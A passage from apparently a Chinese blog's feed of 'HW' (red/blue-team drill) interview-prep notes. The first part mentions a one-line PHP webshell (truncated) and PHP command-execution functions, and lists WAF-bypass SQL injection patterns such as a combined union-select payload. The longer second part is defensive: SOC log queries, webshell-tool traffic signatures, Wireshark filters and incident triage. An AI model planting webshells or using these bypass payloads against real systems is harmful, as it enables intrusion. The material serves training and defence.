一句话木马的代码：</p><p><code>_POST['shell']); ?&gt;</code></p><p>然后寻找上传后的文件位置（绝对路径），可以用蚁剑、中国菜刀等工具连接到主机进行接下来的操作，比如提权。</p></li><li><p>WebShell 有哪些特征？</p><ul><li><p>持久化远程访问</p><p>Webshell 脚本通常会包含后门，黑客上传 Webshell 之后，就可以充分利用 Webshell  的后门实现远程访问并控制服务器，从而达到长期控制网站服务器的目的。此外，在上传完 Webshell  之后，黑客会选择自己修复漏洞，以确保没有其他人会利用该漏洞。通过这种方式，黑客就可以一种低调的姿态，避免与管理员进行任何交互，同时仍然获得相同的结果。</p></li></ul></li><li><p>提权</p><p>在服务器没有配置错误的情况下，Webshell 将在 web 服务器的用户权限下运行，而用户权限是有限的。通过 Webshell，黑客可以利用系统上的本地漏洞来实现权限提升，从而获得  Root 权限，这样黑客基本上可以在系统上做任何事情，包括安装软件、更改权限、添加和删除用户、窃取密码、阅读电子邮件等等。</p></li><li><p>隐藏性极强</p><p>Webshell 可以嵌套在正常网页中运行，且不容易被查杀。它还可以穿越服务器防火墙，由于与被控制服务器或远程主机交互的数据都是通过 80  端口传递，因此不会被防火墙拦截，在没有记录流量的情况下，Webshell 使用 post 包发送，也不会被记录在系统日志中，只会在 Web  日志中记录一些数据提交的记录。</p></li><li><p>WebShell 常用的 PHP 函数</p><p>Webshell 几乎适用于所有 Web 编程语言。之所以关注 PHP，是因为它是 web 上使用最广泛的编程语言。下面是 PHP 中一些执行 shell 命令最常用的函数。</p><ul><li><p>system()</p><p>system () 函数将命令作为参数，并输出结果。</p><p>下面的示例是在 Windows 操作系统上运行 dir 命令，然后返回 PHP 文件所在目录的目录列表。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php    echo system('ls -al');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li></ul><p>exec()</p><p>exec () 功能是将命令作为参数，但不输出结果。</p><p>如果指定了第二个可选参数，则返回结果为数组。否则，如果回显，只显示结果的最后一行。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php    echo exce('ls -al');    echo exce('ls -al',$array);    var_dump($array);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>shell_exec()</p><p>shell_exec () 函数类似于 exec ()，但是，其整个输出结果为字符串。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php    echo shell_exce('ls -al');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>passthru()</p><p>passthru () 执行一个命令并返回原始格式的输出。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php    echo passthru('ls -al');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p>proc_open()</p><p>proc_open () 可以创建一个处理程序（流程），实现脚本和要运行的程序之间的通信。</p></li><li><p>倒引号</p><p>PHP 会首先执行 shell 命令中倒引号（`）内的内容</p><h3 id="三、一句话木马白名单绕过："><a href="#三、一句话木马白名单绕过：" class="headerlink" title="三、一句话木马白名单绕过："></a>三、一句话木马白名单绕过：</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731175233624.png" alt="image-20230731175233624"></p></li></ul><h2 id="四、WAF-是什么"><a href="#四、WAF-是什么" class="headerlink" title="四、WAF 是什么"></a>四、WAF 是什么</h2><p>WAF 设备：绿盟 / 深信服 / 启明星辰 / 360 / 阿里云 WAF / 安全狗等</p><p>WAF 通过一组通常称为策略的规则运行。这些策略旨在通过过滤掉恶意流量来防止应用程序中的漏洞。WAF 的价值部分来自于实施策略修改的速度和便利性，从而可以更快地响应不同的攻击向量；在 DDoS 攻击期间，可以通过修改 WAF 策略快速实现限速。</p><p>** 三种 WAF ** 实现基于网络的 WAF 通常是基于硬件的。</p><ul><li><p>由于它们是在本地安装的，因此可以最大限度地减少延迟，但基于网络的 WAF 是最昂贵的选择，并且还需要存储和维护物理设备。  </p><p>代表产品有：Imperva、天清 WAG 等。</p></li><li><p>基于主机的 WAF 可以完全集成到应用程序的软件中。</p><p>此解决方案比基于网络的 WAF 更便宜，并且提供更多的可定制性。基于主机的 WAF 的缺点是消耗本地服务器资源、实施复杂性和维护成本，这些组件通常需要占用大量资源和时间。</p><p>代表产品：安全狗，云锁，D 盾等。  </p></li><li><p>基于云的 WAF 是一种云防火墙。</p><p>他们通常提供交钥匙安装，就像更改 DNS 以重定向流量一样简单。基于云的 WAF 还具有最低的前期成本，因为用户每月或每年为安全即服务付费。基于云的 WAF  还可以提供持续更新的解决方案，以抵御最新的威胁，而无需在用户端进行任何额外的工作或成本。基于云的 WAF 的缺点是用户将责任移交给第三方，因此  WAF 的某些功能对用户来说可能是一个黑匣子。  </p><p>代表产品有：阿里云云盾，腾讯云 WAF 等。</p></li></ul><h3 id="WAF-的工作原理？"><a href="#WAF-的工作原理？" class="headerlink" title="WAF 的工作原理？"></a>WAF 的工作原理？</h3><p>WAF 的处理流程大致可分为四部分：预处理、规则检测、处理模块、日志记录</p><ul><li><p>预处理</p><p>预处理阶段首先在接收到数据请求流量时会先判断是否为 HTTP/HTTPS 请求，之后会查看此 URL 请求是否在白名单之内，如果该 URL 请求在白名单列表里，直接交给后端 Web 服务器进行响应处理，对于不在白名单之内的对数据包解析后进入到规则检测部分。</p></li><li><p>规则检测</p><p>每一种 WAF 产品都有自己独特的检测规则体系，解析后的数据包会进入到检测体系中进行规则匹配，检查该数据请求是否符合规则，识别出恶意攻击行为。</p></li><li><p>处理模块</p><p>针对不同的检测结果，处理模块会做出不同的安全防御动作，如果符合规则则交给后端 Web 服务器进行响应处理，对于不符合规则的请求会执行相关的阻断、记录、告警处理。不同的 WAF  产品会自定义不同的拦截警告页面，在日常渗透中我们也可以根据不同的拦截页面来辨别出网站使用了哪款 WAF 产品，从而有目的性的进行 WAF 绕过。</p></li><li><p>日志记录</p><p>WAF 在处理的过程中也会将拦截处理的日志记录下来，方便用户在后续中可以进行日志查看分析。</p></li></ul><h3 id="绕-WAF-的多种方式"><a href="#绕-WAF-的多种方式" class="headerlink" title="绕 WAF 的多种方式"></a>绕 WAF 的多种方式</h3><ul><li><p>字母大小写混合绕过</p><p>原因：服务器端检测时未开启大小写不敏感</p><p>形式：<code>UnIon SeLecT</code></p></li><li><p>多重关键字</p><p>原因：服务器端检测到敏感字符时替换为空 </p><p>形式：<code>ununionion selselectect</code></p></li><li><p>注释</p><p>原因：服务器端未检测或检测不严注释内的字符串 </p><p>形式：<code>/**/，/*!*/，/*!12345*/，#，-- -</code> 等</p></li><li><p>编码绕过</p><p>原因：服务器端未检测或检测不严具有编码形式的关键字 </p><p>类型：十六进制编码、URL 编码、Unicode 编码 </p><p>形式：<code>0x61646d696e、%20、%u0020</code></p></li><li><p>等价函数或命令</p><p>原因：服务器端黑名单不完整，过滤不严 </p><p>形式： </p><p>Mysql 查询：<code>Union distinct、updatexml、Extractvalue、floor</code> </p><p>字符串截取函数：<code>mid、substr、substring、left、reverse </code></p><p>字符串连接函数：<code>concat、group_concat、concat_ws </code></p><p>字符串转换：<code>char、hex、unhex</code> </p><p>替换逗号：<code>limit 1 offset 0，mid(version() from 1 for 1) </code></p><p>替换等号：<code>like</code></p></li><li><p>组合绕过</p><p>原因：服务器端检测多处位置，需要多重绕过方式组合使用 </p><p>形式：<code>id = 1’ and/**/’1’like’2’/**//*!12345union*/select 1,2,3</code></p></li><li><p>特殊字符</p><p>原因：数据库中效果相同，服务器端却没有限制 </p><p>形式：</p><p>科学记数法 <code>and 1e0 = 1e0 </code></p><p>空白字符 <code>%0a %a0 %0b %20 %09 </code></p><p>反单引号 <code>table_name</code> </p><p>括号 <code>select * from (test.admin)</code></p></li></ul><h2 id="四、一些常用工具汇总"><a href="#四、一些常用工具汇总" class="headerlink" title="四、一些常用工具汇总"></a>四、一些常用工具汇总</h2><ul><li>威胁情报平台</li></ul><pre class="line-numbers language-BASH" data-language="BASH"><code class="language-BASH">https://x.threatbook.cn/ 微步在线威胁情报社区https://ti.qianxin.com/ 奇安信威胁情报中心https://ti.360.cn/ 360威胁情报中心https://www.venuseye.com.cn/  VenusEye威胁情报中心<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>域名反查</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">站长之家IP查询网址：https://ip.tool.chinaz.com/ipbatchIP138查询网：https://www.ip138.com/高精度IP定位：https://www.opengps.cn/Data/IP/LocHighAcc.aspxIP信息查询：https://www.ipip.net/ip.html/IP地址查询在线工具：https://tool.lu/ip/多地Ping检测：http://ping.chinaz.com/Whois查询：https://whois.chinaz.com/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ip 定位网站</li></ul><pre class="line-numbers language-none"><code class="language-none">https://www.opengps.cn/Data/IP/ipplus.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>在线子域名查询</li></ul><pre class="line-numbers language-none"><code class="language-none">https://phpinfo.me/domain/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>网站指纹识别</li></ul><pre class="line-numbers language-none"><code class="language-none">在线cms识别小插件：http://whatweb.bugscaner.com/look/wahtweb（需要安装）：https://github.com/urbanadventurer/WhatWeb云悉指纹：yunsee.cn-2.0参考链接：https://blog.csdn.net/qq_41755666/article/details/123614559https://blog.csdn.net/zsw15841822890/article/details/115774385<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> HW </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HW面经 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HW面经百问</title>
      <link href="/du-yu/interview.html"/>
      <url>/du-yu/interview.html</url>
      
        <content type="html"><![CDATA[<p>HW面试八十六问（含答案）</p><h2 id="一、常问问题"><a href="#一、常问问题" class="headerlink" title="一、常问问题"></a>一、常问问题</h2><h3 id="问一：用过哪些监控设备？（主要是天眼的操作）"><a href="#问一：用过哪些监控设备？（主要是天眼的操作）" class="headerlink" title="问一：用过哪些监控设备？（主要是天眼的操作）"></a>问一：用过哪些监控设备？（主要是天眼的操作）</h3><p>奇安信的天眼、WAF 、蜜罐、绿盟态势感知、防火墙、IDS（入侵检测系统）、IPS（入侵防御系统），中睿的睿眼，他会自动匹配可能是攻击的数据包，然后通过数据包判断是否是攻击。</p><p>天眼的全称是奇安信新一代安全感知系统，它以攻防渗透和数据分析为核心竞争力，聚焦威胁检测和响应，为安全服务和分析人员提供一套在监测预警、威胁检测、溯源分析和响应处置上得心应手的威胁检测平台。</p><p><img src="/HW%E9%9D%A2%E7%BB%8F100%E9%97%AE%EF%BC%88%E5%90%AB%E7%AD%94%E6%A1%88%EF%BC%89.assets/4ccb9592325494ecdbf78793243f77b0.png" alt="img"> </p><ul><li><p>天眼三大功能：</p><p>传感器（对流量解析还原，发现网络攻击和 web 攻击能力） </p><p>沙箱（发现恶意样本投递能力）</p><p>分析平台（存储历史流量，分析威胁和溯源能力）  </p></li><li><p>天眼使用：</p><p>天眼威胁感知： 警告类型：APT 攻击   威胁级别：高危   攻击结果：失陷    攻击次数：3 </p><p>天眼搜索：源 IP sip   目的 IP dip  地理信息：境内还是境外   </p><p>搜索示例:（sip:”192.168.1.1”）OR（dip:”192.168.1.1”）  </p><p>天眼类别：威胁感知调查分析 场景化分析</p><p>日志检索：例子：search sip:”10.1.1.1/8” |tcp 100 dip 资产 报表 安全服务  系统管理</p></li><li><p>天眼分析：</p><p>爆破和踩点行为分析：</p><p>登录爆破类：单个IP，使用多个用户名和密码组合进行登录尝试，导致短时间内大量登录失败<br>目录和资源爆破：短时间内访问大量url，触发大量404<br>手段：</p><p>1.找到爆破行为IP，阻断爆破行为    </p><p>2.找到攻击成功的IP   </p><p>3.分析攻击IP的操作，编写事件报告</p><p>ftp 爆破：</p><pre class="line-numbers language-none"><code class="language-none">日志检索使用天眼语法搜索爆破IP：normal_ret:failed AND proto:ftp判断爆破成功行为：normal_ret:success  AND proto:ftp AND sip:(攻击ip1 OR 攻击ip2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ssh 爆破：</p><pre class="line-numbers language-none"><code class="language-none">日志检索使用天眼语法搜索爆破IP：normal_ret:failed AND proto:ssh判断爆破成功行为：normal_ret:success AND proto:ssh AND sip(攻击ip1 OR 攻击ip2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>数据库爆破：</p><pre class="line-numbers language-none"><code class="language-none">normal_ret:failed AND proto:(oracle OR mysql OR mssql OR postgresql)normal_ret:success AND proto:(oracle OR mysql OR mssql OR postgresql) AND sip:(攻击IP1 OR 攻击IP2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>远程桌面爆破：</p><pre class="line-numbers language-none"><code class="language-none">normal_ret:failed AND proto:rdpnormal_ret:success AND proto:rdp AND sip:(攻击IP1 OR 攻击IP2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>web 登录入口爆破：</p><pre class="line-numbers language-none"><code class="language-none">对弱口令就行分析：uri:爆破路径 AND sip:攻击ip，查找爆破的流量日志<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>目录和资源猜解：</p><pre class="line-numbers language-none"><code class="language-none">根据域名和攻击ip进行分析：host:域名 AND sip:攻击IP，查询攻击IP的访问记录是否触发大量404响应<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>天眼失陷事件处理：</p><p>1、web攻击分析思路：<br>web攻击：查看请求包 与 响应包（有没有报红，有没有攻击成功）<br>查看告警详情（查看请求头、请求体内容，定位到告警攻击动作的payload）<br>分析攻击动作是什么（读取文件、打印输出内容、写入文件和尝试下载文件，执行函数或命令 XSS  XXE webshell等）<br>分析响应（分析告警响应头，响应体，网络行为是否有动作预期的结果）  </p><p> 发现 webshell 和主机木马： 确认创建时间、功能分析等，查看访问日志，攻击行为记录等，通知主机所属人 对发现的 webshell 文件或木马进行排查处置</p></li></ul><h3 id="问二：以往的HW工作都干些什么？"><a href="#问二：以往的HW工作都干些什么？" class="headerlink" title="问二：以往的HW工作都干些什么？"></a>问二：以往的HW工作都干些什么？</h3><p>我所在的现场，根据甲方需求，分为 4 组：监控组、应急组、处置组、溯源反制组</p><p>1、监测组监测设备，整理报警信息，提交交处置单给防守应急组 ；</p><p>2、防守应急拿到处置单，进行排查，该组没有看机器的权限，只能和处置组建群沟通，根据处置单（期间要不停的去检测组设备上看详细信息），提出处置建议，让处置组来操作；</p><p>3、处置组，主要是甲方的业务人员，因为很多对应急的操作不是很熟悉，而且有些系统他们还需要找系统服务商进行操作，这就增加了沟通的成本；</p><p>4、溯源反制组，根据确定的攻击进行溯源和反制，前两天真实攻击较少所以一个处置单 ，基本消耗在不停的找人的路上，一个处置单最初只有建群的时候只有 3 个人，中间遇到不停的问题不停的加人入群，有负责 VPN  的、系统业务开发公司的、甲方维护的、系统管理的….就这样不停的加，直接一个处置单群，加了 20  多个人。</p><p>每天的服务器流量告警，只有一些寻常的弱口令异常流量和一些简单的 sql 注入，端口扫描事件，我们只需整改弱口令，封禁发起 sql 注入和端口扫描的 ip 即可</p><p>防守日常就是看流量、分析流量，其中大部分都为扫描器流量，由于一般扫描器都会部署在 VPS 上，因此我们可以结合流量监测平台反向扫描。</p><ul><li><p>第一步，安全感知平台查看事件预警，分析预警是否误报，</p><p>误报，忽略；非误报，进行分析</p></li><li><p>第二步，从安全按感知平台，安全设备，对攻击事件进行分析，</p><p>不成功，封禁 IP；成功，开启应急响应排查流程</p></li><li><p>第三步，应急响应，Webshell（网站失陷），</p><p>排查 webshell，并且通过安全平台日志分析漏洞，进行下线或修补漏洞，服务器失陷，应急</p></li></ul><h3 id="问三：攻击类别识别方法有哪些？"><a href="#问三：攻击类别识别方法有哪些？" class="headerlink" title="问三：攻击类别识别方法有哪些？"></a>问三：攻击类别识别方法有哪些？</h3><p><strong>1、识别攻击源 IP</strong>**</p><p>在护网期间，很多局点扫描探测类日志占所有攻击日志（IPS）的 90% 以上，此类日志主要来源于自研 / 开源全网扫描器、僵尸网络发起的自动化感染传播。</p><p>而在攻防演练实战中，攻击者通常采用搜索引擎对目标进行资产收集。在找到资产的网络区间后，细心的攻击方会对 C 段进行全端口扫描，通过连续的端口扫描日志或者 NMAP 指纹信息日志，通常能判定出攻击者针对性的网络探测行为，很可能是演练攻击方。</p><p>有的攻击方在探测目标时，会使用自研的扫描器进行主动扫描，或者通过代理转发至 XRay、W13SCA 扫描器进行被动扫描。这种扫描会在短时间内出现一个源 IP 对一个目标服务器大量的 SQL 注入、XSS 等常规的  WEB 漏洞等攻击日志，这种情况基本也能判定为攻击方行为。</p><p>这类扫描类日志，特点是日志量特别大，攻击源 IP 相对固定，攻击持续时间短或长或短，扫描产生的日志类型较多。值得注意的是，很多客户网络是部署有负载均衡和反向代理设备的，需要获取到日志的真实源 IP 才能进行针对性的防护，切忌直接封堵，以免影响业务。</p><p><strong>2、手工试探类</strong></p><p>在高水准的对抗和演练中，攻击方通常不会进行盲目的扫描。在找到目标资产后，他们会进行谨慎的手工尝试，这类尝试性的日志，很容易被大量的扫描日志所淹没。因此，对于某些提示攻击方意图的告警日志，也需要进行重点处理。</p><p>比如攻击方找到上传点，会进行手工上传测试，找到疑似 Struts2，ThinkPHP 框架的系统，会用开源工具或者带编码绕过的自研工具进行尝试，在登录框进行 SQL 手工尝试，或者用 Shiro  反序列化工具尝试等。这些攻击流量产生的日志数量极少，却不能被防守方轻易忽略，可以针对最近一年或近年爆出的漏洞、以及客户资产情况，进行有针对性的日志搜索，一旦发现，可以进行封堵或加固，同时顺藤摸瓜，或去态势感知等平台上进行上下文关联，进一步判断攻击是否成功、摸出攻击者意图。</p><h3 id="问四、关注那些重点事件日志？"><a href="#问四、关注那些重点事件日志？" class="headerlink" title="问四、关注那些重点事件日志？"></a>问四、关注那些重点事件日志？</h3><p>高级别的演练持续时间为两到三周，进入中后期，人倦马乏，很容易进入懈怠疏漏。其实，攻击方的比拼在演练中段已经进入焦灼状态，大比分在此时拉开。防守方也需要加强投入，在中后期更需要关注一些重点事件，及时发现包括 0day、新增外联、内网异常行为之类的风险。攻击方此时会亮出各家压箱底的武器，0day  的使用和针对防护设备的变形绕过都是常态，不排除现有的防护设备和系统暂时  “失明”，难以全面覆盖到攻击链的每一个点，这时，在日志中发现蛛丝马迹，找到关键重点事件就极有意义。这些重点事件类型包括：</p><p><strong>1、异常属性类</strong></p><p>考虑到攻方可能将扫描器和 C2 服务器部署在个人 VPS 上，而这些 VPS 极有可能是个人购买的云服务。在攻击日志分析时，对于 IP  归属地是国内外的云服务商的情况都需要加以关注。有的攻击方会在深夜乘防守方警惕性降低时进行攻击尝试，因此半夜出现的新增攻击日志源，也值得警惕。</p><p>攻击源 IP 的时间属性也有一定价值，如果某个源 IP 只在攻防演练开始之才出现日志，而之前并未出现过攻击行为，很可能来自于演练攻击方。单纯从攻击日志的各类属性特点来分析日志，也能起到一定作用，当然以上方法结合分析，效果更好。</p><p>NOD（Newly Observed Domain），域名也是可疑的观察对象之一。在演练前突然新增的域名，极有可能是攻击方为活动前做的准备。对于这类 NOD  域名可以提前分析获取，加入关注名单。一旦产生类似的外联日志，哪怕原有的情报和态势系统没有告警，也建议马上行动，展开失陷资产排查，并向前溯源，最大程度的还原攻击路径。</p><p><strong>2、木马连接类</strong></p><p>Webshell  连接工具，包括老式的大马，小马，菜刀，及各类新式的冰蝎，哥斯拉，天蝎，内存马等，特点是倾向于加密的通信，让传统检测设备无法发现行踪。在防守方的日常检测中，一旦发现木马远控连接工具，包括 Cobalt Strike 的命令下发流量（HTTP 协议）和证书指纹规则（HTTPS 协议），MSF 自带木马 Meterpreter  及各类开源远控等的痕迹，以及这些工具通信流量产生的日志都需要警醒，这预示着内网已有机器失陷。部分工具的加密流量通信单纯靠某条规则无法检测，可能需要多模块综合研判以及 AI 分析模块协助处理。所以除了攻击日志，还需要将 AV、情报、AI 研判模块产生的日志一并纳入检测分析范围。</p><p><strong>3、代理隧道类</strong></p><p>在获取权限后，攻击方通常会使用代理工具搭建隧道进入内网，以获得稳定的控制权限。一旦出现代理隧道的日志，也说明形势较为危急，预示着攻击方可能已经打入内网。这些代理类日志包括 SOCKS 的反向代理（Earthworm、FRP、dtunnel_lite 等）、Reduh、Regeorg 等各类 web  代理隧道。传统设备如 IPS  的先验规则只能检测到明文代理流量，新华三安全设备特意基于代理隧道进行了专项覆盖，对于以上代理可以最大程度的识别，加密的隧道，可以在协商阶段尽早识别。</p><p><strong>4、横向扫描类</strong></p><p>利用代理隧道进入内网的攻击方，可能通过 Ladon 等工具进行网段、端口、服务的探测，以及使用爆破，撞库的方式进行内网密码破解。因此由内网 IP 发起的扫描探测日志如果被部署在内网的安全设备检测上报，那么这些日志也是非常值得关注的。</p><p>这几类重点事件的日志，一般表明有系统被攻陷，因此这些规则需要在演练之前保持开启状态，且演练期间关注级别很高，即使出现的日志条数只有一条，也要优先介入分析。这也对防守方攻防基础提出了一定的要求，初级防守方人员可以联动后台攻防实验室进行有效协同，中高级守方人员可以在实战中进行攻击负载和技战法的总结，形成经验智库。</p><p><strong>5、补充</strong></p><p>现场分析人员若对某条攻击日志的具体含义持疑，无法判定攻击源 IP 是否恶意时，可以结合该源 IP 和该事件的其他相关日志进行辅助分析，通过绘制力导向图，来判断该 IP 的攻击意图。</p><ul><li>OA:（重点）泛微，致远，金蝶，蓝凌，万户，金和或者自研发系统 OA，财务系统</li><li>ERP:（重点）Microsoft Dynamics GP，Oracle JD Edwards EnterpriseOne，金蝶 - U9，用友 - K/3, 神舟数码 - 易助，SAP ERP，Infor M3</li><li>重要信息节点：email，exchange，office 365，DC2012R2，DC2008 R2</li><li>web 中间件：IIS/apache/tomcat/weblogic/jboss/websphere/Nginx/FastCGI/PHPCGI/haproxy</li></ul><h3 id="问五：有什么办法判断误报？"><a href="#问五：有什么办法判断误报？" class="headerlink" title="问五：有什么办法判断误报？"></a>问五：有什么办法判断误报？</h3><p>时间线拉长，看看类似的请求或者数据包在之前很长一段时间有无出现。如果不是特别有规律的参数，如 md5 这类，一般是业务误报。如果是一些类似于文件操作或者命令执行的参数，很有可能就是攻击数据包。实在不确定就去问客户。</p><p>处置单大致分为 4 类，</p><p>1、业务系统之间的调用请求，设备报警，内网渗透向；</p><p>2、业务公司人员上生产系统上的 poc 测试（直接执行注入和远程读取命令），被系统误报成渗透攻击（这一条应该不算是误报，毕竟有攻击行为，只不过是自己人干的）；</p><p>3、centos 系统自动更新系统文件，设备报警，未经授权的访问外网；</p><p>4、业务人员配置中间件，设备报警；</p><h3 id="问六：你有那些SQL-查询异常流量分析的思路？"><a href="#问六：你有那些SQL-查询异常流量分析的思路？" class="headerlink" title="问六：你有那些SQL 查询异常流量分析的思路？"></a>问六：你有那些SQL 查询异常流量分析的思路？</h3><p>1、数据库短时间内查询增多有可能遭遇到了【扫描】或者【sql 注入测试】，可以结合流量分析工具进行研判</p><p>2、【select】 和【union】为数据库查询语句特征，当这两者数量出现次数较多而且差异较小可能存在 SOL 注入漏洞或正在被扫描器扫描，可监控这两个关键字，但还需 要进一步查看具体请求参数。</p><p>如：                        </p><p>（1) 使用 wireshark 打开抓取后的流量包                        </p><p>（2) 对于抓取到的数据包筛选出 HTTP 协议包，在统计处筛选出短时间内流量较大的 IP </p><p>（3）尝试定位一些基本的注入特征（select、union、（）、/*、sleep 等）</p><h3 id="问七：讲一下常见工具的流量特征"><a href="#问七：讲一下常见工具的流量特征" class="headerlink" title="问七：讲一下常见工具的流量特征"></a>问七：讲一下常见工具的流量特征</h3><ul><li>菜刀流量特征 (最开始是明文传输，后来采用 base64 加密)</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PHP类WebShell链接流量第一：“eval”，eval函数用于执行传递的攻击payload，这是必不可少的；第二：(base64_decode($_POST[z0]))，(base64_decode($_POST[z0]))将攻击payload进行Base64解码，因为菜刀默认是使用Base64编码，以避免被检测；第三：&amp;z0=QGluaV9zZXQ...，该部分是传递攻击payload，此参数z0对应$_POST[z0]接收到的数据，该参数值是使用Base64编码的，所以可以利用base64解码可以看到攻击明文。注：1.有少数时候eval方法会被assert方法替代。2.\$_POST也会被\$_GET、$_REQUEST替代。3.z0是菜刀默认的参数，这个地方也有可能被修改为其他参数名。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>蚁剑（PHP 用 base64 加密）</li></ul><p>PHP 类 WebShell 链接流量</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">将蚁剑的正文内容进行URL解码后，流量最中明显的特征为@ini_set("display_errors","0");这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码，但是有的客户端会将这段编码或者加密，而蚁剑是明文，所以较好发现，同时蚁剑也有eval这种明显的特征。蚁剑绕过特征流量由于蚁剑中包含了很多加密、绕过插件，所以导致很多流量被加密后无法识别，但是蚁剑混淆加密后还有一个比较明显的特征，即为参数名大多以“_0x.....=”这种形式（下划线可替换为其他）所以，以_0x开头的参数名，后面为加密数据的数据包也可识别为蚁剑的流量特征。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>冰蝎（AES 对称加密）：</li></ul><p>通过 HTTP 请求特征检测</p><p>1、冰蝎数据包总是伴随着大量的 content-type：application 什么什么，无论 GET 还是 POST，请求的 http 中，content-type 为 application/octet-stream；</p><p>2、冰蝎 3.0 内置的默认内置 16 个 ua（user-agent）头</p><p>3、content-length 请求长度，对于上传文件，命令执行来讲，加密的参数不定长。但是对于密钥交互，获取基本信息来讲，payload 都为定长</p><ul><li>哥斯拉（base64 加密）：</li></ul><p>特征检测</p><p>1、发送一段固定代码（payload），http 响应为空 </p><p>2、发送一段固定代码（test），执行结果为固定内容 </p><p>3、发送一段固定代码（getBacisInfo）</p><p>相同：都是用来连接 Web shell 的工具 不相同：相比于其他三款，冰蝎有流量动态加密。</p><h3 id="问八：你知道那些wireshark-简单的过滤规则？"><a href="#问八：你知道那些wireshark-简单的过滤规则？" class="headerlink" title="问八：你知道那些wireshark 简单的过滤规则？"></a>问八：你知道那些wireshark 简单的过滤规则？</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">【过滤ip】：过滤源ip地址:ip.src1.1.1.1;目的ip地址：ip.dst1.1.1.1;【过滤端口】：过滤80端口：tcp.port80，源端口：tcp.srcport80，目的端口：tcp.dstport==80【协议过滤】：直接输入协议名即可，如http协议http【http模式过滤】：过滤get/post包http.request.mothod=="GET/POST"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="问九：你有那些流量分析溯源的思路？"><a href="#问九：你有那些流量分析溯源的思路？" class="headerlink" title="问九：你有那些流量分析溯源的思路？"></a>问九：你有那些流量分析溯源的思路？</h3><p>假设发现 web 应用服务器发现文件异常增多，初步怀疑被上传 webshell，描述流量分析溯源的思路</p><p>可利用流量工具进行溯源：</p><p>1、查看 eval、z0、shell、whoami 等关键字，查看出现次数过多的时候，可能 需要查看是哪个页面发起的请求，有可能是 webshell </p><p>2、通过 WireShark 工具快速搜索关键字，定位到异常流量包 </p><p>3、找出异常 IP 和所上传的内容，查看是否为 webshell </p><h3 id="问十：如何定位到攻击-IP？"><a href="#问十：如何定位到攻击-IP？" class="headerlink" title="问十：如何定位到攻击 IP？"></a>问十：如何定位到攻击 IP？</h3><p>1、 首先通过选择 - 统计 - 对话查看流量的走向情况，定位可疑的 IP 地址 </p><p>2、 根据定位到的 IP 地址，尝试对上传的 webshell 进行定位 ip.addr ==ip &amp;&amp;http matches “uploadleval|select|xp_cmdshell”&amp;&amp; http.request.method ==  “POST” </p><p>3、 查找到 Webshell 后尝试溯源漏洞位置，http.request.uri contains“webshell.php”，定位到最开始 webshell 执行或上传的时候 </p><p>4、 根据最开始的 HTTP 上传包或者其他漏洞特产定位漏洞类型</p><h3 id="问十一：常见取证分析工具有哪些？"><a href="#问十一：常见取证分析工具有哪些？" class="headerlink" title="问十一：常见取证分析工具有哪些？"></a>问十一：常见取证分析工具有哪些？</h3><p>wireshark</p><p>xplico</p><p>volatility</p><p>fastlr collector</p><p>autopsy</p><p>dumolt</p><p>ftk lmager</p><p>foremost</p><p>scalpel</p><p>bulik_exetractor</p><h3 id="问十一：怎么看日志？"><a href="#问十一：怎么看日志？" class="headerlink" title="问十一：怎么看日志？"></a>问十一：怎么看日志？</h3><p><img src="/HW%E9%9D%A2%E7%BB%8F100%E9%97%AE%EF%BC%88%E5%90%AB%E7%AD%94%E6%A1%88%EF%BC%89.assets/LccY1P.png" alt="img"></p><p>1、 特征字符分析 顾名思义，就是根据攻击者利用的漏洞特征，进行判断攻击者使用的是哪一种攻击。SQL 注入、XSS 跨站脚本攻击、恶意文件上传、一句话木马连接等</p><p>2、 访问频率分析 不难理解，就是通过查看攻击者访问的频率来判断攻击者使用的是哪一种攻击，SQL 盲注、敏感目录爆破、账号爆破、Web 扫描。</p><h3 id="问十二：日志的关注点有那些？"><a href="#问十二：日志的关注点有那些？" class="headerlink" title="问十二：日志的关注点有那些？"></a>问十二：日志的关注点有那些？</h3><p><strong>1、异常时间段登录</strong></p><p>比如半夜一两点三四点，有事件 ID4624 产生，服务器有异常登录，开启下列排查，并修改远程桌面密码，尝试溯源。</p><p><strong>2、系统安全日志</strong>，针对服务器。</p><p><strong>3、windows 